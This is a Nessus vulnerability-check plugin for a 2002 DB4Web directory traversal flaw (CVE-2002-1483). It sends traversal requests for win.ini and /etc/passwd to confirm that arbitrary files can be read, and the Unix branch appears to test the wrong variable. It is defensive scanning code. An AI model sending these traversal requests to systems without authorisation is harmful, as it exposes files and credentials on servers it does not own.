# (C) Tenable Network Security, Inc.
#
# References:
#
# From:Stefan.Bagdohn@guardeonic.com
# To:vulnwatch@vulnwatch.org 
# Date: Thu, 19 Sep 2002 11:00:55 +0200
# Subject: Advisory: File disclosure in DB4Web
#

include("compat.inc");

if(description)
{
 script_id(11182);
 script_cve_id("CVE-2002-1483");
 script_bugtraq_id(5723);
 script_osvdb_id(14484);
 script_xref(name:"Secunia", value:"7119");

 script_version ("$Revision: 1.25 $");
  
 script_name(english:"DB4Web Server db4web_c Filename Request Traversal Arbitrary File Access");
 script_summary(english: "Read any file through DB4Web");
 
 script_set_attribute( attribute:"synopsis", value:
"A web application running on the remote host has an directory
traversal vulnerability." );
 script_set_attribute( attribute:"description",  value:
"The version of DB4Web running on the remote web server has an
directory traversal vulnerability.  A remote attacker could use this
to read arbitrary files on the server." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?5db2524e"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Apply the patch referenced in the advisory."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/12/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/09/17");
 script_cvs_date("$Date: 2011/03/14 21:48:02 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english: "CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2002-2011 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl",
                    "http_version.nasl", 
                    "webmirror.nasl", "DDI_Directory_Scanner.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

cgis = get_kb_list("www/" + port + "/cgis");
if (isnull(cgis)) exit(0);
# cgis = make_list(cgis);

k = string("www/no404/", port);
qc=1;
if (get_kb_item(k)) qc=0;

n = 0;
foreach cgi (cgis)
{
  if ("/db4web_c.exe/" >< cgi)
  {
    # Windows
    end = strstr(cgi, "/db4web_c.exe/");
    dir = cgi - end;
    u = strcat(dir, "/db4web_c.exe/c%3A%5Cwindows%5Cwin.ini");
    if (check_win_dir_trav(port: port, url: u))
    {
      security_warning(port);
      exit(0);
    }
    u = strcat(dir, "/db4web_c.exe/c%3A%5Cwinnt%5Cwin.ini");
    if (check_win_dir_trav(port: port, url: u))
    {
      security_warning(port);
      exit(0);
    }
    n ++;
  }
  else if ("/db4web_c/" >< dir)
  {
    # Unix
    end = strstr(cgi, "/db4web_c/");
    dir = cgi - end;
    u = strcat(dir, "/db4web_c//etc/passwd");
    r = http_send_recv3(method: "GET", port: port, item: u);
    if (isnull(r)) exit(0);
    if ("root:" >< r[2])
    {
      security_warning(port);
      exit(0);
    }
    n ++;
  }
}

